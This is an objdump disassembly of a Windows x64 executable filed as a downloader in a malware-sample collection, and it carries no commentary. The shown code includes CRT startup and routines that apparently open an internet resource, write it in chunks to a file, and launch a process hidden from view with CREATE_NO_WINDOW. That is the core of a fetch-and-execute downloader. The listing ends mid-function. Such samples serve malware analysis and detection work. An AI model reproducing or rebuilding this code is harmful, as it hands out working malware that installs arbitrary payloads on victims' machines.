
malware_samples/downloader/8900cf88a91fa4fbe871385c8747c7097537f1b5f4a003418d84c01dc383dd75.exe:     file format pei-x86-64


Disassembly of section .text:

0000000000401000 <.text>:
  401000:	c3                   	ret
  401001:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  401006:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40100d:	00 00 00 
  401010:	48 83 ec 28          	sub    $0x28,%rsp
  401014:	48 8b 05 85 44 00 00 	mov    0x4485(%rip),%rax        # 0x4054a0
  40101b:	31 d2                	xor    %edx,%edx
  40101d:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
  401023:	48 8b 05 86 44 00 00 	mov    0x4486(%rip),%rax        # 0x4054b0
  40102a:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
  401030:	48 8b 05 89 44 00 00 	mov    0x4489(%rip),%rax        # 0x4054c0
  401037:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
  40103d:	48 8b 05 4c 44 00 00 	mov    0x444c(%rip),%rax        # 0x405490
  401044:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
  40104a:	48 8b 05 2f 43 00 00 	mov    0x432f(%rip),%rax        # 0x405380
  401051:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%rax)
  401056:	74 58                	je     0x4010b0
  401058:	48 8b 05 21 44 00 00 	mov    0x4421(%rip),%rax        # 0x405480
  40105f:	89 15 a3 6f 00 00    	mov    %edx,0x6fa3(%rip)        # 0x408008
  401065:	8b 00                	mov    (%rax),%eax
  401067:	85 c0                	test   %eax,%eax
  401069:	74 35                	je     0x4010a0
  40106b:	b9 02 00 00 00       	mov    $0x2,%ecx
  401070:	e8 1b 1e 00 00       	call   0x402e90
  401075:	e8 86 1e 00 00       	call   0x402f00
  40107a:	48 8b 15 bf 43 00 00 	mov    0x43bf(%rip),%rdx        # 0x405440
  401081:	8b 12                	mov    (%rdx),%edx
  401083:	89 10                	mov    %edx,(%rax)
  401085:	e8 36 09 00 00       	call   0x4019c0
  40108a:	48 8b 05 9f 42 00 00 	mov    0x429f(%rip),%rax        # 0x405330
  401091:	83 38 01             	cmpl   $0x1,(%rax)
  401094:	74 5a                	je     0x4010f0
  401096:	31 c0                	xor    %eax,%eax
  401098:	48 83 c4 28          	add    $0x28,%rsp
  40109c:	c3                   	ret
  40109d:	0f 1f 00             	nopl   (%rax)
  4010a0:	b9 01 00 00 00       	mov    $0x1,%ecx
  4010a5:	e8 e6 1d 00 00       	call   0x402e90
  4010aa:	eb c9                	jmp    0x401075
  4010ac:	0f 1f 40 00          	nopl   0x0(%rax)
  4010b0:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
  4010b4:	48 01 c8             	add    %rcx,%rax
  4010b7:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
  4010bd:	75 99                	jne    0x401058
  4010bf:	0f b7 48 18          	movzwl 0x18(%rax),%ecx
  4010c3:	66 81 f9 0b 01       	cmp    $0x10b,%cx
  4010c8:	74 39                	je     0x401103
  4010ca:	66 81 f9 0b 02       	cmp    $0x20b,%cx
  4010cf:	75 87                	jne    0x401058
  4010d1:	83 b8 84 00 00 00 0e 	cmpl   $0xe,0x84(%rax)
  4010d8:	0f 86 7a ff ff ff    	jbe    0x401058
  4010de:	8b 88 f8 00 00 00    	mov    0xf8(%rax),%ecx
  4010e4:	31 d2                	xor    %edx,%edx
  4010e6:	85 c9                	test   %ecx,%ecx
  4010e8:	0f 95 c2             	setne  %dl
  4010eb:	e9 68 ff ff ff       	jmp    0x401058
  4010f0:	48 8d 0d d9 0b 00 00 	lea    0xbd9(%rip),%rcx        # 0x401cd0
  4010f7:	e8 c4 0b 00 00       	call   0x401cc0
  4010fc:	31 c0                	xor    %eax,%eax
  4010fe:	48 83 c4 28          	add    $0x28,%rsp
  401102:	c3                   	ret
  401103:	83 78 74 0e          	cmpl   $0xe,0x74(%rax)
  401107:	0f 86 4b ff ff ff    	jbe    0x401058
  40110d:	44 8b 80 e8 00 00 00 	mov    0xe8(%rax),%r8d
  401114:	31 d2                	xor    %edx,%edx
  401116:	45 85 c0             	test   %r8d,%r8d
  401119:	0f 95 c2             	setne  %dl
  40111c:	e9 37 ff ff ff       	jmp    0x401058
  401121:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  401126:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40112d:	00 00 00 
  401130:	48 83 ec 38          	sub    $0x38,%rsp
  401134:	48 8b 05 35 43 00 00 	mov    0x4335(%rip),%rax        # 0x405470
  40113b:	4c 8d 05 ce 6e 00 00 	lea    0x6ece(%rip),%r8        # 0x408010
  401142:	48 8d 15 cf 6e 00 00 	lea    0x6ecf(%rip),%rdx        # 0x408018
  401149:	48 8d 0d d0 6e 00 00 	lea    0x6ed0(%rip),%rcx        # 0x408020
  401150:	8b 00                	mov    (%rax),%eax
  401152:	89 05 a8 6e 00 00    	mov    %eax,0x6ea8(%rip)        # 0x408000
  401158:	48 8d 05 a1 6e 00 00 	lea    0x6ea1(%rip),%rax        # 0x408000
  40115f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  401164:	48 8b 05 c5 42 00 00 	mov    0x42c5(%rip),%rax        # 0x405430
  40116b:	44 8b 08             	mov    (%rax),%r9d
  40116e:	e8 2d 1d 00 00       	call   0x402ea0
  401173:	90                   	nop
  401174:	48 83 c4 38          	add    $0x38,%rsp
  401178:	c3                   	ret
  401179:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  401180:	41 55                	push   %r13
  401182:	41 54                	push   %r12
  401184:	55                   	push   %rbp
  401185:	57                   	push   %rdi
  401186:	56                   	push   %rsi
  401187:	53                   	push   %rbx
  401188:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
  40118f:	31 c0                	xor    %eax,%eax
  401191:	b9 0d 00 00 00       	mov    $0xd,%ecx
  401196:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
  40119b:	48 89 d7             	mov    %rdx,%rdi
  40119e:	f3 48 ab             	rep stos %rax,(%rdi)
  4011a1:	48 8b 3d d8 42 00 00 	mov    0x42d8(%rip),%rdi        # 0x405480
  4011a8:	44 8b 0f             	mov    (%rdi),%r9d
  4011ab:	45 85 c9             	test   %r9d,%r9d
  4011ae:	0f 85 bc 02 00 00    	jne    0x401470
  4011b4:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
  4011bb:	00 00 
  4011bd:	48 8b 1d 0c 42 00 00 	mov    0x420c(%rip),%rbx        # 0x4053d0
  4011c4:	31 ed                	xor    %ebp,%ebp
  4011c6:	48 8b 70 08          	mov    0x8(%rax),%rsi
  4011ca:	4c 8b 25 6b 81 00 00 	mov    0x816b(%rip),%r12        # 0x40933c
  4011d1:	eb 11                	jmp    0x4011e4
  4011d3:	48 39 c6             	cmp    %rax,%rsi
  4011d6:	0f 84 34 02 00 00    	je     0x401410
  4011dc:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
  4011e1:	41 ff d4             	call   *%r12
  4011e4:	48 89 e8             	mov    %rbp,%rax
  4011e7:	f0 48 0f b1 33       	lock cmpxchg %rsi,(%rbx)
  4011ec:	48 85 c0             	test   %rax,%rax
  4011ef:	75 e2                	jne    0x4011d3
  4011f1:	48 8b 35 e8 41 00 00 	mov    0x41e8(%rip),%rsi        # 0x4053e0
  4011f8:	31 ed                	xor    %ebp,%ebp
  4011fa:	8b 06                	mov    (%rsi),%eax
  4011fc:	83 f8 01             	cmp    $0x1,%eax
  4011ff:	0f 84 22 02 00 00    	je     0x401427
  401205:	8b 06                	mov    (%rsi),%eax
  401207:	85 c0                	test   %eax,%eax
  401209:	0f 84 71 02 00 00    	je     0x401480
  40120f:	c7 05 eb 6d 00 00 01 	movl   $0x1,0x6deb(%rip)        # 0x408004
  401216:	00 00 00 
  401219:	8b 06                	mov    (%rsi),%eax
  40121b:	83 f8 01             	cmp    $0x1,%eax
  40121e:	0f 84 18 02 00 00    	je     0x40143c
  401224:	85 ed                	test   %ebp,%ebp
  401226:	0f 84 31 02 00 00    	je     0x40145d
  40122c:	48 8b 05 3d 41 00 00 	mov    0x413d(%rip),%rax        # 0x405370
  401233:	48 8b 00             	mov    (%rax),%rax
  401236:	48 85 c0             	test   %rax,%rax
  401239:	74 0c                	je     0x401247
  40123b:	45 31 c0             	xor    %r8d,%r8d
  40123e:	ba 02 00 00 00       	mov    $0x2,%edx
  401243:	31 c9                	xor    %ecx,%ecx
  401245:	ff d0                	call   *%rax
  401247:	e8 84 0d 00 00       	call   0x401fd0
  40124c:	48 8d 0d cd 12 00 00 	lea    0x12cd(%rip),%rcx        # 0x402520
  401253:	ff 15 db 80 00 00    	call   *0x80db(%rip)        # 0x409334
  401259:	48 8b 15 60 41 00 00 	mov    0x4160(%rip),%rdx        # 0x4053c0
  401260:	48 89 02             	mov    %rax,(%rdx)
  401263:	e8 c8 11 00 00       	call   0x402430
  401268:	48 8d 0d 91 fd ff ff 	lea    -0x26f(%rip),%rcx        # 0x401000
  40126f:	e8 6c 1c 00 00       	call   0x402ee0
  401274:	e8 57 0b 00 00       	call   0x401dd0
  401279:	48 8b 05 00 41 00 00 	mov    0x4100(%rip),%rax        # 0x405380
  401280:	48 89 05 e1 76 00 00 	mov    %rax,0x76e1(%rip)        # 0x408968
  401287:	e8 64 1c 00 00       	call   0x402ef0
  40128c:	31 c9                	xor    %ecx,%ecx
  40128e:	48 8b 00             	mov    (%rax),%rax
  401291:	48 85 c0             	test   %rax,%rax
  401294:	75 1c                	jne    0x4012b2
  401296:	eb 5f                	jmp    0x4012f7
  401298:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40129f:	00 
  4012a0:	84 d2                	test   %dl,%dl
  4012a2:	74 2c                	je     0x4012d0
  4012a4:	83 e1 01             	and    $0x1,%ecx
  4012a7:	74 27                	je     0x4012d0
  4012a9:	b9 01 00 00 00       	mov    $0x1,%ecx
  4012ae:	48 83 c0 01          	add    $0x1,%rax
  4012b2:	0f b6 10             	movzbl (%rax),%edx
  4012b5:	80 fa 20             	cmp    $0x20,%dl
  4012b8:	7e e6                	jle    0x4012a0
  4012ba:	41 89 c8             	mov    %ecx,%r8d
  4012bd:	41 83 f0 01          	xor    $0x1,%r8d
  4012c1:	80 fa 22             	cmp    $0x22,%dl
  4012c4:	41 0f 44 c8          	cmove  %r8d,%ecx
  4012c8:	eb e4                	jmp    0x4012ae
  4012ca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4012d0:	84 d2                	test   %dl,%dl
  4012d2:	75 11                	jne    0x4012e5
  4012d4:	eb 1a                	jmp    0x4012f0
  4012d6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4012dd:	00 00 00 
  4012e0:	80 fa 20             	cmp    $0x20,%dl
  4012e3:	7f 0b                	jg     0x4012f0
  4012e5:	48 83 c0 01          	add    $0x1,%rax
  4012e9:	0f b6 10             	movzbl (%rax),%edx
  4012ec:	84 d2                	test   %dl,%dl
  4012ee:	75 f0                	jne    0x4012e0
  4012f0:	48 89 05 69 76 00 00 	mov    %rax,0x7669(%rip)        # 0x408960
  4012f7:	44 8b 07             	mov    (%rdi),%r8d
  4012fa:	45 85 c0             	test   %r8d,%r8d
  4012fd:	74 16                	je     0x401315
  4012ff:	f6 44 24 5c 01       	testb  $0x1,0x5c(%rsp)
  401304:	b8 0a 00 00 00       	mov    $0xa,%eax
  401309:	0f 85 f1 00 00 00    	jne    0x401400
  40130f:	89 05 eb 2c 00 00    	mov    %eax,0x2ceb(%rip)        # 0x404000
  401315:	8b 1d 05 6d 00 00    	mov    0x6d05(%rip),%ebx        # 0x408020
  40131b:	44 8d 63 01          	lea    0x1(%rbx),%r12d
  40131f:	4d 63 e4             	movslq %r12d,%r12
  401322:	49 c1 e4 03          	shl    $0x3,%r12
  401326:	4c 89 e1             	mov    %r12,%rcx
  401329:	e8 da 1a 00 00       	call   0x402e08
  40132e:	85 db                	test   %ebx,%ebx
  401330:	48 8b 3d e1 6c 00 00 	mov    0x6ce1(%rip),%rdi        # 0x408018
  401337:	48 89 c5             	mov    %rax,%rbp
  40133a:	7e 4b                	jle    0x401387
  40133c:	8d 43 ff             	lea    -0x1(%rbx),%eax
  40133f:	31 db                	xor    %ebx,%ebx
  401341:	4c 8d 2c c5 08 00 00 	lea    0x8(,%rax,8),%r13
  401348:	00 
  401349:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  401350:	48 8b 0c 1f          	mov    (%rdi,%rbx,1),%rcx
  401354:	e8 87 1a 00 00       	call   0x402de0
  401359:	48 8d 70 01          	lea    0x1(%rax),%rsi
  40135d:	48 89 f1             	mov    %rsi,%rcx
  401360:	e8 a3 1a 00 00       	call   0x402e08
  401365:	49 89 f0             	mov    %rsi,%r8
  401368:	48 89 44 1d 00       	mov    %rax,0x0(%rbp,%rbx,1)
  40136d:	48 8b 14 1f          	mov    (%rdi,%rbx,1),%rdx
  401371:	48 89 c1             	mov    %rax,%rcx
  401374:	48 83 c3 08          	add    $0x8,%rbx
  401378:	e8 83 1a 00 00       	call   0x402e00
  40137d:	49 39 dd             	cmp    %rbx,%r13
  401380:	75 ce                	jne    0x401350
  401382:	4a 8d 44 25 f8       	lea    -0x8(%rbp,%r12,1),%rax
  401387:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
  40138e:	48 89 2d 83 6c 00 00 	mov    %rbp,0x6c83(%rip)        # 0x408018
  401395:	e8 f6 05 00 00       	call   0x401990
  40139a:	48 8b 05 ef 3f 00 00 	mov    0x3fef(%rip),%rax        # 0x405390
  4013a1:	48 8b 15 68 6c 00 00 	mov    0x6c68(%rip),%rdx        # 0x408010
  4013a8:	8b 0d 72 6c 00 00    	mov    0x6c72(%rip),%ecx        # 0x408020
  4013ae:	48 8b 00             	mov    (%rax),%rax
  4013b1:	48 89 10             	mov    %rdx,(%rax)
  4013b4:	4c 8b 05 55 6c 00 00 	mov    0x6c55(%rip),%r8        # 0x408010
  4013bb:	48 8b 15 56 6c 00 00 	mov    0x6c56(%rip),%rdx        # 0x408018
  4013c2:	e8 49 1c 00 00       	call   0x403010
  4013c7:	8b 0d 3b 6c 00 00    	mov    0x6c3b(%rip),%ecx        # 0x408008
  4013cd:	89 05 39 6c 00 00    	mov    %eax,0x6c39(%rip)        # 0x40800c
  4013d3:	85 c9                	test   %ecx,%ecx
  4013d5:	0f 84 c3 00 00 00    	je     0x40149e
  4013db:	8b 15 23 6c 00 00    	mov    0x6c23(%rip),%edx        # 0x408004
  4013e1:	85 d2                	test   %edx,%edx
  4013e3:	75 0b                	jne    0x4013f0
  4013e5:	e8 8e 1a 00 00       	call   0x402e78
  4013ea:	8b 05 1c 6c 00 00    	mov    0x6c1c(%rip),%eax        # 0x40800c
  4013f0:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
  4013f7:	5b                   	pop    %rbx
  4013f8:	5e                   	pop    %rsi
  4013f9:	5f                   	pop    %rdi
  4013fa:	5d                   	pop    %rbp
  4013fb:	41 5c                	pop    %r12
  4013fd:	41 5d                	pop    %r13
  4013ff:	c3                   	ret
  401400:	0f b7 44 24 60       	movzwl 0x60(%rsp),%eax
  401405:	e9 05 ff ff ff       	jmp    0x40130f
  40140a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  401410:	48 8b 35 c9 3f 00 00 	mov    0x3fc9(%rip),%rsi        # 0x4053e0
  401417:	bd 01 00 00 00       	mov    $0x1,%ebp
  40141c:	8b 06                	mov    (%rsi),%eax
  40141e:	83 f8 01             	cmp    $0x1,%eax
  401421:	0f 85 de fd ff ff    	jne    0x401205
  401427:	b9 1f 00 00 00       	mov    $0x1f,%ecx
  40142c:	e8 4f 1a 00 00       	call   0x402e80
  401431:	8b 06                	mov    (%rsi),%eax
  401433:	83 f8 01             	cmp    $0x1,%eax
  401436:	0f 85 e8 fd ff ff    	jne    0x401224
  40143c:	48 8b 15 bd 3f 00 00 	mov    0x3fbd(%rip),%rdx        # 0x405400
  401443:	48 8b 0d a6 3f 00 00 	mov    0x3fa6(%rip),%rcx        # 0x4053f0
  40144a:	e8 21 1a 00 00       	call   0x402e70
  40144f:	85 ed                	test   %ebp,%ebp
  401451:	c7 06 02 00 00 00    	movl   $0x2,(%rsi)
  401457:	0f 85 cf fd ff ff    	jne    0x40122c
  40145d:	31 c0                	xor    %eax,%eax
  40145f:	48 87 03             	xchg   %rax,(%rbx)
  401462:	e9 c5 fd ff ff       	jmp    0x40122c
  401467:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40146e:	00 00 
  401470:	48 89 d1             	mov    %rdx,%rcx
  401473:	ff 15 6b 7e 00 00    	call   *0x7e6b(%rip)        # 0x4092e4
  401479:	e9 36 fd ff ff       	jmp    0x4011b4
  40147e:	66 90                	xchg   %ax,%ax
  401480:	48 8b 15 99 3f 00 00 	mov    0x3f99(%rip),%rdx        # 0x405420
  401487:	c7 06 01 00 00 00    	movl   $0x1,(%rsi)
  40148d:	48 8b 0d 7c 3f 00 00 	mov    0x3f7c(%rip),%rcx        # 0x405410
  401494:	e8 d7 19 00 00       	call   0x402e70
  401499:	e9 7b fd ff ff       	jmp    0x401219
  40149e:	89 c1                	mov    %eax,%ecx
  4014a0:	e8 9b 19 00 00       	call   0x402e40
  4014a5:	90                   	nop
  4014a6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4014ad:	00 00 00 
  4014b0:	48 83 ec 28          	sub    $0x28,%rsp
  4014b4:	48 8b 05 c5 3f 00 00 	mov    0x3fc5(%rip),%rax        # 0x405480
  4014bb:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
  4014c1:	e8 0a 05 00 00       	call   0x4019d0
  4014c6:	e8 b5 fc ff ff       	call   0x401180
  4014cb:	90                   	nop
  4014cc:	90                   	nop
  4014cd:	48 83 c4 28          	add    $0x28,%rsp
  4014d1:	c3                   	ret
  4014d2:	0f 1f 40 00          	nopl   0x0(%rax)
  4014d6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4014dd:	00 00 00 
  4014e0:	48 83 ec 28          	sub    $0x28,%rsp
  4014e4:	48 8b 05 95 3f 00 00 	mov    0x3f95(%rip),%rax        # 0x405480
  4014eb:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
  4014f1:	e8 da 04 00 00       	call   0x4019d0
  4014f6:	e8 85 fc ff ff       	call   0x401180
  4014fb:	90                   	nop
  4014fc:	90                   	nop
  4014fd:	48 83 c4 28          	add    $0x28,%rsp
  401501:	c3                   	ret
  401502:	0f 1f 40 00          	nopl   0x0(%rax)
  401506:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40150d:	00 00 00 
  401510:	48 83 ec 28          	sub    $0x28,%rsp
  401514:	e8 47 19 00 00       	call   0x402e60
  401519:	48 85 c0             	test   %rax,%rax
  40151c:	0f 94 c0             	sete   %al
  40151f:	0f b6 c0             	movzbl %al,%eax
  401522:	f7 d8                	neg    %eax
  401524:	48 83 c4 28          	add    $0x28,%rsp
  401528:	c3                   	ret
  401529:	90                   	nop
  40152a:	90                   	nop
  40152b:	90                   	nop
  40152c:	90                   	nop
  40152d:	90                   	nop
  40152e:	90                   	nop
  40152f:	90                   	nop
  401530:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 0x401540
  401537:	e9 d4 ff ff ff       	jmp    0x401510
  40153c:	0f 1f 40 00          	nopl   0x0(%rax)
  401540:	c3                   	ret
  401541:	90                   	nop
  401542:	90                   	nop
  401543:	90                   	nop
  401544:	90                   	nop
  401545:	90                   	nop
  401546:	90                   	nop
  401547:	90                   	nop
  401548:	90                   	nop
  401549:	90                   	nop
  40154a:	90                   	nop
  40154b:	90                   	nop
  40154c:	90                   	nop
  40154d:	90                   	nop
  40154e:	90                   	nop
  40154f:	90                   	nop
  401550:	48 83 ec 38          	sub    $0x38,%rsp
  401554:	4c 8d 05 a5 3a 00 00 	lea    0x3aa5(%rip),%r8        # 0x405000
  40155b:	ba 00 01 00 00       	mov    $0x100,%edx
  401560:	4c 89 4c 24 58       	mov    %r9,0x58(%rsp)
  401565:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
  40156a:	4c 89 4c 24 28       	mov    %r9,0x28(%rsp)
  40156f:	e8 4c 18 00 00       	call   0x402dc0
  401574:	48 83 c4 38          	add    $0x38,%rsp
  401578:	c3                   	ret
  401579:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  401580:	41 57                	push   %r15
  401582:	41 56                	push   %r14
  401584:	41 55                	push   %r13
  401586:	41 54                	push   %r12
  401588:	55                   	push   %rbp
  401589:	57                   	push   %rdi
  40158a:	56                   	push   %rsi
  40158b:	53                   	push   %rbx
  40158c:	48 81 ec 58 04 00 00 	sub    $0x458,%rsp
  401593:	45 31 c9             	xor    %r9d,%r9d
  401596:	45 31 c0             	xor    %r8d,%r8d
  401599:	31 d2                	xor    %edx,%edx
  40159b:	48 89 cb             	mov    %rcx,%rbx
  40159e:	c7 44 24 48 01 00 00 	movl   $0x1,0x48(%rsp)
  4015a5:	00 
  4015a6:	48 8d 0d 56 3a 00 00 	lea    0x3a56(%rip),%rcx        # 0x405003
  4015ad:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
  4015b4:	00 
  4015b5:	ff 15 e9 7e 00 00    	call   *0x7ee9(%rip)        # 0x4094a4
  4015bb:	45 31 c9             	xor    %r9d,%r9d
  4015be:	45 31 c0             	xor    %r8d,%r8d
  4015c1:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
  4015c8:	00 00 
  4015ca:	48 8d 15 3f 3a 00 00 	lea    0x3a3f(%rip),%rdx        # 0x405010
  4015d1:	48 89 c1             	mov    %rax,%rcx
  4015d4:	49 89 c7             	mov    %rax,%r15
  4015d7:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
  4015de:	00 
  4015df:	ff 15 c7 7e 00 00    	call   *0x7ec7(%rip)        # 0x4094ac
  4015e5:	45 31 c9             	xor    %r9d,%r9d
  4015e8:	45 31 c0             	xor    %r8d,%r8d
  4015eb:	ba 00 00 00 40       	mov    $0x40000000,%edx
  4015f0:	48 89 c7             	mov    %rax,%rdi
  4015f3:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
  4015fa:	00 
  4015fb:	48 89 d9             	mov    %rbx,%rcx
  4015fe:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
  401605:	00 00 
  401607:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%rsp)
  40160e:	00 
  40160f:	ff 15 8f 7c 00 00    	call   *0x7c8f(%rip)        # 0x4092a4
  401615:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
  401619:	48 89 c6             	mov    %rax,%rsi
  40161c:	0f 84 9e 00 00 00    	je     0x4016c0
  401622:	8b 54 24 48          	mov    0x48(%rsp),%edx
  401626:	85 d2                	test   %edx,%edx
  401628:	74 59                	je     0x401683
  40162a:	4c 8b 2d 83 7e 00 00 	mov    0x7e83(%rip),%r13        # 0x4094b4
  401631:	4c 8d 74 24 48       	lea    0x48(%rsp),%r14
  401636:	48 8b 2d 2f 7d 00 00 	mov    0x7d2f(%rip),%rbp        # 0x40936c
  40163d:	48 8d 5c 24 50       	lea    0x50(%rsp),%rbx
  401642:	4c 8d 64 24 4c       	lea    0x4c(%rsp),%r12
  401647:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40164e:	00 00 
  401650:	4d 89 f1             	mov    %r14,%r9
  401653:	41 b8 00 04 00 00    	mov    $0x400,%r8d
  401659:	48 89 da             	mov    %rbx,%rdx
  40165c:	48 89 f9             	mov    %rdi,%rcx
  40165f:	41 ff d5             	call   *%r13
  401662:	4d 89 e1             	mov    %r12,%r9
  401665:	44 8b 44 24 48       	mov    0x48(%rsp),%r8d
  40166a:	48 89 da             	mov    %rbx,%rdx
  40166d:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
  401674:	00 00 
  401676:	48 89 f1             	mov    %rsi,%rcx
  401679:	ff d5                	call   *%rbp
  40167b:	8b 44 24 48          	mov    0x48(%rsp),%eax
  40167f:	85 c0                	test   %eax,%eax
  401681:	75 cd                	jne    0x401650
  401683:	48 89 f9             	mov    %rdi,%rcx
  401686:	48 8b 1d 0f 7e 00 00 	mov    0x7e0f(%rip),%rbx        # 0x40949c
  40168d:	ff d3                	call   *%rbx
  40168f:	4c 89 f9             	mov    %r15,%rcx
  401692:	ff d3                	call   *%rbx
  401694:	48 89 f1             	mov    %rsi,%rcx
  401697:	ff 15 ff 7b 00 00    	call   *0x7bff(%rip)        # 0x40929c
  40169d:	b8 01 00 00 00       	mov    $0x1,%eax
  4016a2:	48 81 c4 58 04 00 00 	add    $0x458,%rsp
  4016a9:	5b                   	pop    %rbx
  4016aa:	5e                   	pop    %rsi
  4016ab:	5f                   	pop    %rdi
  4016ac:	5d                   	pop    %rbp
  4016ad:	41 5c                	pop    %r12
  4016af:	41 5d                	pop    %r13
  4016b1:	41 5e                	pop    %r14
  4016b3:	41 5f                	pop    %r15
  4016b5:	c3                   	ret
  4016b6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4016bd:	00 00 00 
  4016c0:	31 c0                	xor    %eax,%eax
  4016c2:	eb de                	jmp    0x4016a2
  4016c4:	66 90                	xchg   %ax,%ax
  4016c6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4016cd:	00 00 00 
  4016d0:	57                   	push   %rdi
  4016d1:	53                   	push   %rbx
  4016d2:	48 81 ec e8 00 00 00 	sub    $0xe8,%rsp
  4016d9:	31 c0                	xor    %eax,%eax
  4016db:	4c 8d 4c 24 74       	lea    0x74(%rsp),%r9
  4016e0:	48 89 ca             	mov    %rcx,%rdx
  4016e3:	b9 0c 00 00 00       	mov    $0xc,%ecx
  4016e8:	c7 44 24 70 68 00 00 	movl   $0x68,0x70(%rsp)
  4016ef:	00 
  4016f0:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
  4016f5:	4c 89 cf             	mov    %r9,%rdi
  4016f8:	45 31 c9             	xor    %r9d,%r9d
  4016fb:	48 c7 44 24 50 00 00 	movq   $0x0,0x50(%rsp)
  401702:	00 00 
  401704:	f3 48 ab             	rep stos %rax,(%rdi)
  401707:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
  40170c:	48 c7 44 24 58 00 00 	movq   $0x0,0x58(%rsp)
  401713:	00 00 
  401715:	48 c7 44 24 60 00 00 	movq   $0x0,0x60(%rsp)
  40171c:	00 00 
  40171e:	c7 07 00 00 00 00    	movl   $0x0,(%rdi)
  401724:	4c 89 44 24 40       	mov    %r8,0x40(%rsp)
  401729:	45 31 c0             	xor    %r8d,%r8d
  40172c:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
  401731:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
  401738:	00 00 
  40173a:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
  401741:	00 00 
  401743:	c7 44 24 28 00 00 00 	movl   $0x8000000,0x28(%rsp)
  40174a:	08 
  40174b:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
  401752:	00 
  401753:	ff 15 53 7b 00 00    	call   *0x7b53(%rip)        # 0x4092ac
  401759:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
  40175e:	48 8b 1d 37 7b 00 00 	mov    0x7b37(%rip),%rbx        # 0x40929c
  401765:	ff d3                	call   *%rbx
  401767:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
  40176c:	ff d3                	call   *%rbx
  40176e:	90                   	nop
  40176f:	48 81 c4 e8 00 00 00 	add    $0xe8,%rsp
  401776:	5b                   	pop    %rbx
  401777:	5f                   	pop    %rdi
  401778:	c3                   	ret
  401779:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  401780:	48 83 ec 28          	sub    $0x28,%rsp
  401784:	48 8d 15 a4 38 00 00 	lea    0x38a4(%rip),%rdx        # 0x40502f
  40178b:	e8 a0 16 00 00       	call   0x402e30
  401790:	31 d2                	xor    %edx,%edx
  401792:	48 85 c0             	test   %rax,%rax
  401795:	74 0d                	je     0x4017a4
  401797:	48 89 c1             	mov    %rax,%rcx
  40179a:	e8 99 16 00 00       	call   0x402e38
  40179f:	ba 01 00 00 00       	mov    $0x1,%edx
  4017a4:	89 d0                	mov    %edx,%eax
  4017a6:	48 83 c4 28          	add    $0x28,%rsp
  4017aa:	c3                   	ret
  4017ab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4017b0:	48 83 ec 28          	sub    $0x28,%rsp
  4017b4:	ff 15 da 7a 00 00    	call   *0x7ada(%rip)        # 0x409294
  4017ba:	48 8d 0d 70 38 00 00 	lea    0x3870(%rip),%rcx        # 0x405031
  4017c1:	31 d2                	xor    %edx,%edx
  4017c3:	ff 15 bb 7c 00 00    	call   *0x7cbb(%rip)        # 0x409484
  4017c9:	31 d2                	xor    %edx,%edx
  4017cb:	48 89 c1             	mov    %rax,%rcx
  4017ce:	48 83 c4 28          	add    $0x28,%rsp
  4017d2:	48 ff 25 b3 7c 00 00 	rex.W jmp *0x7cb3(%rip)        # 0x40948c
  4017d9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  4017e0:	57                   	push   %rdi
  4017e1:	56                   	push   %rsi
  4017e2:	53                   	push   %rbx
  4017e3:	48 81 ec 20 01 00 00 	sub    $0x120,%rsp
